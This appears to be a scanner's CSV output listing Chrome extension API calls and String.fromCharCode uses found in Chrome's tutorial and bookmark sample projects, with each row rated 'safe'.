functional-samples/tutorial.getting-started/popup.js,12,chrome.scripting.executeScript,chrome. ... r\r\n  }),safe,chrome,"chrome.scripting.executeScript({ target: { tabId: tab.id }, func: setPageBackgroundColor })"
functional-samples/tutorial.mole-game/controller/service-worker.js,4,chrome.alarms.create,chrome. ...  * 3 }),safe,chrome,chrome.alarms.create({ periodInMinutes: (1 / 60) * 3 })
functional-samples/tutorial.mole-game/controller/service-worker.js,8,chrome.management.getAll,chrome. ... etAll(),safe,chrome,chrome.management.getAll()
functional-samples/tutorial.mole-game/controller/service-worker.js,13,chrome.runtime.sendMessage,chrome. ... e.id }),safe,chrome,"chrome.runtime.sendMessage(moles[randomIndex].id, { id: chrome.runtime.id })"
functional-samples/tutorial.mole-game/mole/service-worker.js,8,chrome.runtime.sendMessage,chrome. ... ccess'),safe,chrome,"chrome.runtime.sendMessage(controllerId, 'success')"
functional-samples/tutorial.mole-game/mole/service-worker.js,30,chrome.tabs.query,chrome. ... ery({}),safe,chrome,chrome.tabs.query({})
functional-samples/tutorial.open-api-reference/content.js,6,chrome.runtime.sendMessage,chrome. ... tip' }),safe,chrome,chrome.runtime.sendMessage({ greeting: 'tip' })
functional-samples/tutorial.open-api-reference/sw-omnibox.js,27,chrome.tabs.create,chrome. ... nput }),safe,chrome,chrome.tabs.create({ url: URL_CHROME_EXTENSIONS_DOC + input })
functional-samples/tutorial.open-api-reference/sw-tips.js,14,chrome.alarms.create,chrome. ... 1440 }),safe,chrome,"chrome.alarms.create({ delayInMinutes: 1, periodInMinutes: 1440 })"
functional-samples/tutorial.quick-api-reference/content.js,6,chrome.runtime.sendMessage,chrome. ... tip' }),safe,chrome,chrome.runtime.sendMessage({ greeting: 'tip' })
functional-samples/tutorial.quick-api-reference/sw-omnibox.js,30,chrome.tabs.create,chrome. ... nput }),safe,chrome,chrome.tabs.create({ url: URL_CHROME_EXTENSIONS_DOC + input })
functional-samples/tutorial.quick-api-reference/sw-tips.js,16,chrome.alarms.get,chrome. ... M_NAME),safe,chrome,chrome.alarms.get(ALARM_NAME)
functional-samples/tutorial.quick-api-reference/sw-tips.js,18,chrome.alarms.create,chrome. ... \n    }),safe,chrome,"chrome.alarms.create(ALARM_NAME, { delayInMinutes: 1, periodInMinutes: 1440 })"
functional-samples/tutorial.tabs-manager/popup.js,15,chrome.tabs.query,chrome. ...   ]\r\n}),safe,chrome,"chrome.tabs.query({ url: [ 'https://developer.chrome.com/docs/webstore/*', 'https://developer.chrome.com/docs/extensions/*' ] })"
functional-samples/tutorial.tabs-manager/popup.js,38,chrome.tabs.update,chrome. ... true }),safe,chrome,"chrome.tabs.update(tab.id, { active: true })"
functional-samples/tutorial.tabs-manager/popup.js,50,chrome.tabs.group,chrome. ... bIds }),safe,chrome,chrome.tabs.group({ tabIds })
functional-samples/tutorial.terminate-sw/test-extension/page.js,5,chrome.runtime.sendMessage,chrome. ... 'ping'),safe,chrome,chrome.runtime.sendMessage('ping')
functional-samples/tutorial.terminate-sw/test-extension/service-worker-broken.js,4,chrome.runtime.getManifest,chrome. ... ifest(),safe,chrome,chrome.runtime.getManifest()
functional-samples/tutorial.terminate-sw/test-extension/service-worker-fixed.js,2,chrome.runtime.getManifest,chrome. ... ifest(),safe,chrome,chrome.runtime.getManifest()
functional-samples/sample.bookmarks/third-party/jquery-1.12.4.js,730,String.fromCharCode,String.fromCharCode argument: high + 0x10000,String. ... 10000 ),safe,others,String.fromCharCode( high + 0x10000 )
functional-samples/sample.bookmarks/third-party/jquery-1.12.4.js,732,String.fromCharCode,String.fromCharCode argument: high >> 10 | 0xD800,String. ... xDC00 ),safe,others,"String.fromCharCode( high >> 10 | 0xD800, high & 0x3FF | 0xDC00 )"
functional-samples/sample.bookmarks/third-party/jquery-ui-1.12.1.js,7560,String.fromCharCode,String.fromCharCode argument: event.keyCode,String. ... yCode ),safe,others,String.fromCharCode( event.keyCode )
functional-samples/sample.bookmarks/third-party/jquery-ui-1.12.1.js,7578,String.fromCharCode,String.fromCharCode argument: event.keyCode,String. ... yCode ),safe,others,String.fromCharCode( event.keyCode )
functional-samples/sample.bookmarks/third-party/jquery-ui-1.12.1.js,10269,String.fromCharCode,String.fromCharCode argument: event.c ... harCode,String. ... rCode ),safe,others,String.fromCharCode( event.charCode == null ? event.keyCode : event.charCode )
